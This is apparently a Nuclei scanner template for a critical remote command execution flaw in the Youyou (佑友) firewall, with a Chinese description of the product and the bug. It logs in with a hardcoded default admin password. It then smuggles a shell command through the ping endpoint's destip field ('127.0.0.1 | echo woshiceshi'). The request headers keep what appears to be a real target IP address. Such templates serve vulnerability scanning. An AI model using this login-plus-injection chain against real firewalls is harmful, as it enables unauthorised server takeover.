id: youyou-firewall-rce
info:
  name: 佑友防火墙 后台命令执行漏洞
  author: apple
  severity: critical
  description: 佑友防火墙+路由，保障您的网络更安全更稳定。弥补传统路由器因内外人数增加带来的网络延迟和不稳定问题；防火墙模块具备了防黑功能，防止ARP等病毒骚扰；佑友防火墙网关同时还配备了上网行为管理模块，可以合理有效控制员工上网行为，大大降低了员工上网中病毒的概率，同时高效使用公司带宽，不会造成网络阻塞等状况。佑友防火墙系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
  reference:
    - https://mp.weixin.qq.com/s/DE34Gu6Dw9hBbkdJqizSYQ
  tags: tags
http:
  - raw:
      - |-
        POST /index.php?c=user&a=ajax_save HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 49
        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Sec-Ch-Ua-Mobile: ?0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Sec-Ch-Ua-Platform: "macOS"
        Origin: https://113.116.148.205:888
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://113.116.148.205:888/index.php
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Priority: u=1, i
        Connection: close

        username=admin&password=hicomadmin&language=zh-cn
      - |-
        POST /index.php?c=maintain&a=ping HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{FWSESSID}}; {{PHPSESSID}}; lange=zh-cn
        Content-Length: 47
        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Sec-Ch-Ua-Mobile: ?0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Sec-Ch-Ua-Platform: "macOS"
        Origin: https://113.116.148.205:888
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://113.116.148.205:888/index.php
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Priority: u=1, i
        Connection: close

        interface=&destip=127.0.0.1+%7C+echo+woshiceshi
    matchers:
      - type: word
        part: body
        words:
          - 'woshiceshi'
    extractors:
      - type: regex
        name: PHPSESSID
        internal: true
        part: header_1
        regex:
          - 'PHPSESSID=([a-fA-F0-9]+)'
      - type: regex
        name: FWSESSID
        internal: true
        part: header_1
        regex:
          - 'FWSESSID=([a-fA-F0-9]+)' 